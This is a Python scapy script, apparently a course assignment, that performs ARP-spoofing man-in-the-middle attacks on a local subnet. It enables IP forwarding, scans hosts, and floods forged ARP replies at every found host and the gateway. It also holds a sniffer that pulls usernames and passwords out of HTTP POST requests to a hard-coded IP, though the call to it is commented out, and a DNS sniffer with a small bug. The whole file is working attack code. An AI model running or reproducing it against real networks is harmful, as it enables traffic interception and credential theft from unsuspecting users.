import os
import sys
import re
import time
from scapy.all import *
from uuid import getnode
import subprocess
from scapy.layers.http import HTTPRequest

TARGET_WEBSITE = '140.113.207.246'

def forwarding(open):
    os.system('sudo sysctl -w net.ipv4.ip_forward={} > /dev/null 2>&1'.format(str(open)))


def attacker():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	IP = ""
	try:
		s.connect(('8.8.8.8', 1))
		IP = s.getsockname()[0]
	except:
		IP = '127.0.0.1'
	finally:
		s.close()

	mac = getnode()
	mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))   

	return str(IP), str(mac)

def ap(vip,vmac):
	c = 0
	for i in vip:
		if(i.endswith(".1")):
			ip = vip[c]; mac = vmac[c]
			del vip[c]; del vmac[c]
			return ip, mac
		c += 1
	return "",""


def scan_net(ip):

	subprocess.run("sudo ip -s -s neigh flush all > /dev/null 2>&1",shell=True)
	prefix_ip = ".".join(ip.split(".")[:3])
	for i in range(255):
		try_ip = prefix_ip+".{}".format(i)
		subprocess.run("sudo arp -d {} > /dev/null 2>&1".format(try_ip),shell=True)
		subprocess.run("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip),shell=True)
	time.sleep(2)

	stream = os.popen('arp -a | grep -v incomplete')

	vip = []
	vmac = []

	lines = stream.readline()

	while lines:
		line = lines.split()
		line[1] = re.sub('[()]', '', line[1])
		vip.append(line[1])
		vmac.append(line[3])
		lines = stream.readline()
	
	sys.stdout.write("{:<20}{:<20}\n".format("IP", "MAC Address"))
	for i in range(len(vip)):
		sys.stdout.write("{:<20}{:<20}\n".format(vip[i], vmac[i]))


	print("\nscan network completed.")
	print("="*23)

	return vip,vmac




def arp():
	attacker_ip, attacker_mac = attacker()

	vip, vmac = scan_net(attacker_ip)

	
	ap_ip, ap_mac = ap(vip,vmac)

	# p = []
	# for i in range(len(vip)):
	# 	p.append(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
	# 	hwdst=vmac[i], hwsrc=attacker_mac, op=2))		


	for v in range(len(vip)):
		for i in range(10):
			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
			time.sleep(0.1)

	print("arp spoffing completed.")
	print("="*23)
	

# spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
# 		sendp(spoof_vic_pkt)
# 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
# 		sendp(spoof_ap_pkt)

def show_http_pkt(packet):
	if packet.haslayer(HTTPRequest):
		method = packet[HTTPRequest].Method.decode()
		if(packet[IP].dst == TARGET_WEBSITE  and packet.haslayer(Raw) and method == "POST"):
			raw_data = packet[Raw].load
			match = re.split(r'&', raw_data.decode())
			usr_name = re.split(r'=', match[0])[1]
			usr_pwd = re.split(r'=', match[1])[1]
			print('src_ip: ', packet[IP].src, 'user: ', usr_name,
		            'password: ', usr_pwd)




def middle_man():
	# s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
	# s.show()
	# dstport = s[0][TCP].sport
	# seqq = s[0][TCP].seq
	# result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
	# 	TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
	# result.show()
	sniff(count=0, prn = show_http_pkt, filter="port 80")


def show_dns_pkt(packet):
	if IP in packet and packet.haslayer(DNS):
		dns = pkt.getlayer(DNS)
		print(dns)

def DNS_inter():
	sniff(count=0, prn = show_dns_pkt, filter="port 53")

forwarding(1)
arp()
DNS_inter()
#middle_man()

